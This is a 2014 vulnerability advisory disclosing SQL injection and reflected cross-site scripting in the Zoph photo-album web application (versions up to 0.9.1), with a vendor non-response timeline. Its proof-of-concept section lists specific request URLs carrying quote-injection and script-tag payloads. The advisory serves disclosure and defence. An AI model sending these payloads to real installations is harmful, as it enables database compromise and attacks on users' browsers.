@@ -1,0 +1,84 @@
+=============================================
+MGC ALERT 2014-005
+- Original release date: March 5, 2014
+- Last revised:  November 18, 2014
+- Discovered by: Manuel Garcia Cardenas
+- Severity: 10/10 (CVSS Base Score)
+=============================================
+
+I. VULNERABILITY
+-------------------------
+Multiple Vulnerabilities in Zoph <= 0.9.1
+
+II. BACKGROUND
+-------------------------
+Zoph (Zoph Organizes Photos) is a web based digital image presentation and
+management system. In other words, a photo album. It is built with PHP,
+MySQL and Perl.
+
+III. DESCRIPTION
+-------------------------
+It is possible to inject SQL code in the variables "id" and "action" on the
+pages group, photos and user. This bug was found using the portal with
+authentication. To exploit the vulnerability only is needed use the version
+1.0 of the HTTP protocol to interact with the application.
+Has been detected a reflected XSS vulnerability in Zoph, that allows the
+execution of arbitrary HTML/script code to be executed in the context of
+the victim user's browser.
+
+IV. PROOF OF CONCEPT
+-------------------------
+SQL Injection:
+
+/zoph/php/group.php?_action=1'%22&_clear_crumbs=1
+/zoph/php/photos.php?location_id=1'%22
+/zoph/php/user.php?user_id=&_action=1'%22
+
+Cross-Site Scripting GET:
+
+/zoph/php/edit_photos.php?photographer_id=3"><script>alert(1)</script>
+/zoph/php/edit_photos.php?album_id=2&_crumb=3"><script>alert(1)</script>
+
+V. BUSINESS IMPACT
+-------------------------
+Public defacement, confidential data leakage, and database server
+compromise can result from these attacks. Client systems can also be
+targeted, and complete compromise of these client systems is also possible.
+
+VI. SYSTEMS AFFECTED
+-------------------------
+Zoph <= 0.9.1
+
+VII. SOLUTION
+-------------------------
+No news releases
+
+VIII. REFERENCES
+-------------------------
+http://www.zoph.org/
+
+IX. CREDITS
+-------------------------
+This vulnerability has been discovered and reported
+by Manuel Garcia Cardenas (advidsec (at) gmail (dot) com).
+
+X. REVISION HISTORY
+-------------------------
+March 11, 2014 1: Initial release
+
+XI. DISCLOSURE TIMELINE
+-------------------------
+March 5, 2014 1: Vulnerability acquired by Manuel Garcia Cardenas
+March 5, 2014 2: Send to vendor
+June 17, 2014 3: Second mail to the verdor without response
+November 18, 2014 4: Sent to lists
+
+XII. LEGAL NOTICES
+-------------------------
+The information contained within this advisory is supplied "as-is" with no
+warranties or guarantees of fitness of use or otherwise.
+
+XIII. ABOUT
+-------------------------
+Manuel Garcia Cardenas
+Pentester
